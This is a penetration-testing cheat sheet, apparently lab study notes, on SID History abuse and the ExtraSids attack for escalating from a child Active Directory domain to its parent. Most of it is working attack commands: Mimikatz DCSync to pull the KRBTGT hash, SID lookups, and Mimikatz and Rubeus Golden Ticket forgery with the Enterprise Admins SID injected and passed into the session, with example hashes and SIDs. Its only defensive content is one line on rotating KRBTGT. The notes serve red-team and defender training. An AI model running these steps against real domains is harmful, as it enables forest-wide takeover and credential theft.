Child -> Parent Trusts - from Windows
# SID History Abuse Cheat Sheet

## Overview
- **What it is**: sidHistory attribute stores previous SIDs from migrations (e.g., user moves domains, old SID added for resource access continuity).
- **How it works**: On login, all SIDs (including history) added to access token; determines resource access.
- **Abuse potential**: Inject privileged SID (e.g., Domain Admin) into controlled account's sidHistory for priv esc/persistence.
  - Enables DCSync, Golden Ticket creation, or TGT for any account.
- **ExtraSids Attack**: Escalate from child to parent domain in same forest (no SID Filtering within forest; filtering only cross-forest trusts).
  - Inject Enterprise Admins SID (parent) into child domain account; gain forest-wide admin access.
  - Creates Golden Ticket from child to compromise parent without group membership.
- **Mitigation**: Rotate KRBTGT password (invalidates Golden Tickets); do after compromise/pen test.
- **Notes**: Works same-domain or cross-domain; target user can be fake/non-existent for Golden Ticket.

## Requirements for ExtraSids (Child -> Parent)
- KRBTGT NT hash (child domain): For signing Golden Ticket.
- SID (child domain).
- Target user name (child domain; can be fake like "hacker").
- FQDN (child domain).
- Enterprise Admins SID (parent/root domain).

## Gathering Data
- **KRBTGT NT Hash**: Use DCSync as Domain Admin (child).
  ```
  mimikatz # lsadump::dcsync /user:CHILD_DOMAIN\krbtgt
  ```
  - Outputs NTLM hash (e.g., 9d765b482771505cbe97411065964d5f).
- **Child Domain SID**: From DCSync output or PowerView.
  ```
  Get-DomainSID
  ```
  - Example: S-1-5-21-2806153819-209893948-922872689
- **Enterprise Admins SID (Parent)**: PowerView or Get-ADGroup.
  ```
  Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
  ```
  - Or: `Get-ADGroup -Identity "Enterprise Admins" -Server "PARENT_DOMAIN"`
  - Example: S-1-5-21-3842939050-3880317879-2865463114-519
- **Confirm No Access (Pre-Attack)**: Test parent DC share.
  ```
  ls \\PARENT_DC.FQDN\c$
  ```
  - Expect: Access denied.

## Attack Execution - Mimikatz
- **Create Golden Ticket with Extra SID**:
  ```
  mimikatz # kerberos::golden /user:TARGET_USER /domain:CHILD_FQDN /sid:CHILD_SID /krbtgt:CHILD_KRBTGT_NT /sids:PARENT_EA_SID /ptt
  ```
  - Example:
    ```
    kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
    ```
  - /ptt: Pass-the-Ticket (injects into session).
- **Verify Ticket in Memory**:
  ```
  klist
  ```
  - Look for: Client/Server with child domain, encryption type, flags.
- **Test Access**: Access parent resources (e.g., DC share).
```
  ls \\PARENT_DC.FQDN\c$
```


## Attack Execution - Rubeus
- **Create Golden Ticket with Extra SID**:
  ```
  .\Rubeus.exe golden /rc4:CHILD_KRBTGT_NT /domain:CHILD_FQDN /sid:CHILD_SID /sids:PARENT_EA_SID /user:TARGET_USER /ptt
  ```
  - Example:
    ```
    .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
    ```
  - /rc4: NT hash (RC4 equivalent).
- **Verify Ticket in Memory**:
  ```
  klist
  ```
  - Similar to Mimikatz output.
- **Test Access**: Same as Mimikatz (e.g., DCSync parent).

## Performing a DCSync Attack

```powershell-session
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```
When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:

```powershell-session
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

---
## Key Tools
- **Mimikatz**: DCSync for KRBTGT, kerberos::golden for injection.
- **Rubeus**: golden for injection (alternative to Mimikatz).
- **PowerView**: Get-DomainSID, Get-DomainGroup for SIDs.
- **Built-in**: Get-ADGroup (for SIDs), klist (verify tickets), ls (test access).
- **Tips**: Post-attack, rotate KRBTGT; use for forest compromise from child; fake users work for tickets.